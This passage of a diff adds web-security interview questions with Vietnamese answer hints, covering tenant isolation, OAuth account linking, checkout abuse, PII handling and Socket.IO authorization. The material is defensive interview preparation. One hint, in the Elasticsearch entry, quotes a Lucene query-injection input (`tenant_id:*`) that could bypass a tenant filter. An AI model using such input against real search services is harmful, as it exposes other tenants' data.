+      5. **Test**: suite cross-tenant tự động cho mọi endpoint; fuzz ID.
+      6. **Detect**: log tenant của dữ liệu trả về vs tenant của request, alert khi lệch.
+    followUp: RLS with a connection pool — how do you make sure the tenant setting doesn't leak to the next request using that connection?
+    tags: [multi-tenancy, isolation, rls, design]
+  - id: web-security-057
+    level: senior
+    type: behavioral
+    q: Tell me about a security issue you found or fixed in production. How did you handle it, and what changed afterwards?
+    hint: |-
+      STAR:
+      - **S/T**: hệ thống, loại lỗ hổng (IDOR, lộ secret, XSS...), ai phát hiện, mức độ.
+      - **A**: contain trước (flag/rotate), đánh giá phạm vi bằng log, fix gốc, review các chỗ tương tự, giao tiếp với stakeholder.
+      - **R**: thời gian khắc phục, không/có dữ liệu bị lộ, thay đổi quy trình (test, lint, checklist).
+      - Reflection: điều sẽ làm khác, cách ngăn cả **lớp** lỗi chứ không chỉ một bug.
+      (điền số liệu thật của bạn)
+    followUp: How did you make sure the same class of bug didn't reappear elsewhere?
+    tags: [behavioral, incident-response]
+  - id: web-security-058
+    level: cv
+    type: scenario
+    q: You implemented permission checks across APIs and business resources on a multi-tenant platform. How did you make sure no endpoint shipped without an authorization check?
+    hint: |-
+      Câu trả lời mạnh có:
+      - Mặc định **deny**: middleware/guard toàn cục yêu cầu mỗi route khai báo permission (decorator/metadata), route không khai báo → fail khi boot/test.
+      - Check ở **2 tầng**: function level (permission trên route) + object level (resource thuộc tenant/user) trong service/repository.
+      - Test: suite tự động gọi mọi route với user không đủ quyền và user tenant khác.
+      - Review checklist/lint; audit log cho 403.
+      - Một lần phát hiện thiếu check (nếu có) và cách vá.
+      (điền số liệu thật của bạn: số endpoint, số role/permission)
+    followUp: Where did object-level checks live in your codebase — controller, service, or repository? Why there?
+    tags: [cv, authorization, bola]
+  - id: web-security-059
+    level: cv
+    type: scenario
+    q: You added Google OAuth login next to email/password. How did you link a Google identity to an existing account without enabling account takeover?
+    hint: |-
+      Câu trả lời mạnh có:
+      - Định danh bằng `sub` của Google (không phải email); bảng `user_identities(provider, provider_sub, user_id)`.
+      - Chỉ auto-link khi `email_verified = true` **và** chính sách rõ; an toàn hơn: yêu cầu user đang đăng nhập (hoặc xác nhận password/OTP) để liên kết.
+      - Rủi ro: attacker đăng ký trước bằng email nạn nhân (pre-account takeover) → khi nạn nhân login Google bị gộp vào tài khoản attacker; account email/password chưa verify.
+      - Verify ID token đầy đủ (`iss`, `aud`, `exp`, chữ ký, `nonce`), `state` chống CSRF.
+      - Multi-tenant: user login Google rồi vẫn phải có membership trong tenant.
+      (điền số liệu thật của bạn)
+    followUp: What happens if a user changes the email on their Google account?
+    tags: [cv, oauth, account-linking]
+  - id: web-security-060
+    level: cv
+    type: scenario
+    q: Your Elasticsearch-backed search serves many tenants. How did you prevent cross-tenant results and query injection from user search input?
+    hint: |-
+      Câu trả lời mạnh có:
+      - Tenant filter là **`bool.filter` term `tenant_id`** thêm ở server (không từ client), hoặc filtered alias/index per tenant — lý do chọn.
+      - Không đưa input thô vào `query_string` (cú pháp Lucene: `tenant_id:*`, wildcard tốn tài nguyên) → dùng `multi_match`/`simple_query_string` với field allowlist, giới hạn độ dài.
+      - Giới hạn `size`/`from` (deep pagination → `search_after`), aggregation, timeout.
+      - Cluster không public, auth + TLS, user ES của app quyền tối thiểu.
+      (điền số liệu thật của bạn)
+    followUp: What does a `query_string` query let an attacker do that `match` doesn't?
+    tags: [cv, elasticsearch, multi-tenancy, injection]
+  - id: web-security-061
+    level: cv
+    type: scenario
+    q: In the Checkout module you built, which values from the client did you refuse to trust, and how did you protect coupon redemption from abuse?
+    hint: |-
+      Câu trả lời mạnh có:
+      - Không tin: giá, discount, tổng tiền, phí ship, thuế, `tenantId`, `customerId` — server tính lại từ catalog/promotion/address.
+      - Coupon: kiểm tra điều kiện server-side, redeem **atomic** (conditional update/unique constraint `(coupon_id, user_id)`) chống race dùng nhiều lần, rate limit thử mã, log.
+      - Idempotency cho checkout; so sánh số tiền PSP trả về với order.
+      - Một abuse thật đã gặp (nếu có).
+      (điền số liệu thật của bạn)
+    followUp: Two concurrent checkouts use a single-use coupon at the same millisecond. Walk me through what your code does.
+    tags: [cv, checkout, business-logic]
+  - id: web-security-062
+    level: cv
+    type: scenario
+    q: Address Management stores customer PII. What did you do about access control, data exposure and logging for addresses?
+    hint: |-
+      Câu trả lời mạnh có:
+      - IDOR: address luôn truy vấn theo `(id, customer_id, tenant_id)`; staff tenant xem theo permission.
+      - Exposure: response DTO tối thiểu, mask trong list, không trả address trong API không cần.
+      - Logging: không log full address/phone; redaction ở logger.
+      - Validation: schema, độ dài, chống stored XSS khi hiển thị trên admin/label in.
+      - Retention/xoá theo yêu cầu (nếu có).
+      (điền số liệu thật của bạn)
+    followUp: An order must keep the address as it was at purchase time even if the customer edits it later. How did you model that?
+    tags: [cv, pii, idor]
+  - id: web-security-063
+    level: cv
+    type: behavioral
+    q: While refactoring legacy modules, did you find security problems? Give one example and how you fixed it without breaking existing clients.
+    hint: |-
+      STAR:
+      - **S**: module legacy nào, vấn đề gì (SQL nối chuỗi, thiếu check quyền, secret hardcode, trả dư field).
+      - **A**: characterization test trước, fix theo hướng tương thích (giữ response shape, thêm check), rollout sau flag, theo dõi 403/lỗi.
+      - **R**: kết quả, số chỗ tương tự đã quét.
+      - Reflection: cách ngăn lặp lại (lint, template).
+      (điền số liệu thật của bạn)
+    followUp: How did you handle clients that depended on the insecure behavior?
+    tags: [cv, legacy, refactoring]
+  - id: web-security-064
+    level: cv
+    type: scenario
+    q: On the real-time financial platform with Socket.IO, how did you authenticate sockets and authorize which rooms or channels a client could join?
+    hint: |-
+      Câu trả lời mạnh có:
+      - Auth ở **handshake** (`io.use` middleware đọc token từ `auth` payload hoặc cookie), reject trước khi connect; token hết hạn → re-auth/disconnect.
+      - Authorization khi **join room**: server quyết định room (theo user/account), không để client tự `join` room tuỳ ý.
+      - **Cross-Site WebSocket Hijacking**: nếu dùng cookie → kiểm tra `Origin` trong handshake (Socket.IO `cors`/`allowRequest`).
+      - Validate mọi event payload, rate limit event per socket.
+      - Không gửi dữ liệu nhạy cảm vào broadcast room rộng.
+      (điền số liệu thật của bạn)
+    followUp: A user's permissions are revoked while their socket is connected. What happens in your system?
+    tags: [cv, websocket, socket-io, authorization]
